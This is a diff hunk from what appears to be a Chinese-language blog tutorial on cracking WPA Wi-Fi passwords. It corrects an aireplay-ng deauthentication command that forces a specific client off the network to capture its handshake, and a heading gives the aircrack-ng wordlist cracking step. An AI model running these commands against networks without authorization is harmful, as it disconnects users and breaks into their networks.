@@ -887,7 +887,7 @@
 </blockquote>
 <p><img src="http://note.youdao.com/yws/public/resource/1b76f7e1beb93f9e28e44bca46fca90a/xmlnote/7DC28669142B44EEBFB4F75AD6887744/918" alt="image"></p>
 <h4 id="emsp-5-利用aireplay-ng-aireplay-0-3-a-AP-MAC-c-STA-MAC-interface-emsp-迫使MAC为-98-01-A7-C5-F7-6D的主机下线重连Wi-Fi，以便抓取四步握手"><a href="#emsp-5-利用aireplay-ng-aireplay-0-3-a-AP-MAC-c-STA-MAC-interface-emsp-迫使MAC为-98-01-A7-C5-F7-6D的主机下线重连Wi-Fi，以便抓取四步握手" class="headerlink" title="&emsp;5.利用aireplay-ng(aireplay -0 3 -a [AP MAC] -c [STA MAC] [interface] &emsp;迫使MAC为 98:01:A7:C5:F7:6D的主机下线重连Wi-Fi，以便抓取四步握手"></a>&emsp;5.利用aireplay-ng(aireplay -0 3 -a [AP MAC] -c [STA MAC] [interface] &emsp;迫使MAC为 98:01:A7:C5:F7:6D的主机下线重连Wi-Fi，以便抓取四步握手</h4><blockquote>
-<p>aireplay -0 3 -c 98:01:A7:C5:F7:6D -a E4:F3:F5:2D:55:A8 wlan0mon</p>
+<p>aireplay-ng -0 3 -a E4:F3:F5:2D:55:A8 -c 98:01:A7:C5:F7:6D wlan0mon</p>
 </blockquote>
 <p><img src="http://note.youdao.com/yws/public/resource/1b76f7e1beb93f9e28e44bca46fca90a/xmlnote/1AF5BBD248E54CB8AB60B5D4F144D421/926" alt="image"></p>
 <h4 id="emsp-6-调用aircrack-ng破解密码-aircrack-ng-w-wordlist-txt-wpa-01-cap"><a href="#emsp-6-调用aircrack-ng破解密码-aircrack-ng-w-wordlist-txt-wpa-01-cap" class="headerlink" title="&emsp;6.调用aircrack-ng破解密码(aircrack-ng -w [wordlist.txt] wpa-01.cap)"></a>&emsp;6.调用aircrack-ng破解密码(aircrack-ng -w [wordlist.txt] wpa-01.cap)</h4><blockquote>
